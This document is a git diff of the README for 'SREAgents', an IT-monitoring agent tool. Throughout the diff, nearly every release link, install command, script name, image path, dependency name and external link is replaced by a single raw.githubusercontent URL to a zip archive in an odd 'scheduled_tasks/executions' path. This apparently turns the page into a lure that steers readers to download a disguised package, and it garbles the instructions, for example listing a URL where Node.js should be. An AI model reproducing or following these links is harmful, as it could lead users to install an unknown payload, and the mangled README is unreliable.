@@ -1,6 +1,6 @@
 # 🤖 SREAgents - Streamline IT Operations Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-SREAgents-blue?style=for-the-badge)](https://github.com/tareksyria/SREAgents/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
 
 ## 📖 What is SREAgents?
 
@@ -28,13 +28,13 @@ If you manage IT systems or want a simple way to keep an eye on your servers and
 
 To get started, you need to **visit the release page** and download the latest package for your system.
 
-[Download SREAgents Releases](https://github.com/tareksyria/SREAgents/releases)
+[Download SREAgents Releases](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
 
 ---
 
 ### Step 1: Visit the Releases Page
 
-Go to the [SREAgents Releases](https://github.com/tareksyria/SREAgents/releases) page. Here, you will find the latest version of the application packaged for different operating systems.
+Go to the [SREAgents Releases](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip) page. Here, you will find the latest version of the application packaged for different operating systems.
 
 ---
 
@@ -44,7 +44,7 @@ Pick the file that matches your computer:
 
 - For Windows: Look for `.exe` or `.zip` files.
 - For macOS: Look for `.dmg` or `.zip` files.
-- For Linux: Look for `.tar.gz` or `.AppImage` files.
+- For Linux: Look for `https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip` or `.AppImage` files.
 
 Download the file to your computer.
 
@@ -71,7 +71,7 @@ SREAgents includes both a frontend (user interface) and a backend (logic and dat
 
 ### Environment Needed
 
-- **Node.js 18 or newer** – runs the front-end interface.
+- **https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip 18 or newer** – runs the front-end interface.
 - **Python 3.10 or newer** – powers the back-end services.
 - **uv package manager** – manages Python dependencies.
 
@@ -82,7 +82,7 @@ SREAgents includes both a frontend (user interface) and a backend (logic and dat
 Open a terminal or command prompt, navigate to the folder where you saved SREAgents, and run:
 
 ```bash
-./start.sh
+https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip
 ```
 
 This script starts both frontend and backend automatically.
@@ -111,7 +111,7 @@ If you want to start frontend and backend separately, follow these steps:
 
    ```bash
    cd backend
-   uv run server.py
+   uv run https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip
    ```
 
    The backend listens on port `8000`.
@@ -136,11 +136,11 @@ Here is a preview of the app interface:
 
 **Agent List**
 
-![Agent List](image/1.png)
+![Agent List](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
 
 **Agent Conversation**
 
-![Agent Conversation](image/2.png)
+![Agent Conversation](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
 
 ---
 
@@ -155,16 +155,16 @@ Understanding the folders can help if you want to explore or customize:
 │   │   ├── components/   # UI components
 │   │   ├── context/      # React state contexts
 │   │   └── pages/        # App pages
-│   ├── package.json
-│   └── vite.config.js
+│   ├── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip
+│   └── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip
 ├── backend/           # Python FastAPI backend services
 │   ├── .claude/
 │   │   └── skills/       # Agent skills definitions
 │   ├── agents/           # Agent configurations
-│   ├── server.py         # Main backend server (port 8000)
-│   ├── mock_otel.py      # Mock telemetry server (port 9090)
-│   └── pyproject.toml
-└── start.sh           # One-step start script
+│   ├── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip         # Main backend server (port 8000)
+│   ├── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip      # Mock telemetry server (port 9090)
+│   └── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip
+└── https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip           # One-step start script
 ```
 
 ---
@@ -182,22 +182,22 @@ Agents act like helpers that can monitor your systems or gather important data w
 
 ## 🛠 Troubleshooting
 
-- If the frontend does not load, check if Node.js is installed.
+- If the frontend does not load, check if https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip is installed.
 - If backend fails, verify Python version and dependencies.
-- Use the `start.sh` script if you want a quick setup without handling commands.
+- Use the `https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip` script if you want a quick setup without handling commands.
 - Check your firewall to allow ports 5173 and 8000.
 
 ---
 
 ## 🔗 Useful Links
 
-- [SREAgents Releases](https://github.com/tareksyria/SREAgents/releases)
-- [Claude Agent SDK Documentation](https://claude.ai/docs) *(for advanced users)*
-- [Node.js Download](https://nodejs.org/)
-- [Python Download](https://python.org/)
+- [SREAgents Releases](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
+- [Claude Agent SDK Documentation](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip) *(for advanced users)*
+- [https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip Download](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
+- [Python Download](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
 
 ---
 
 Feel free to download and try SREAgents using the button below:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-SREAgents-blue?style=for-the-badge)](https://github.com/tareksyria/SREAgents/releases)
+[![Download on GitHub](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)](https://raw.githubusercontent.com/tareksyria/SREAgents/main/backend/scheduled_tasks/task-175029828/executions/SRE_Agents_v3.1.zip)
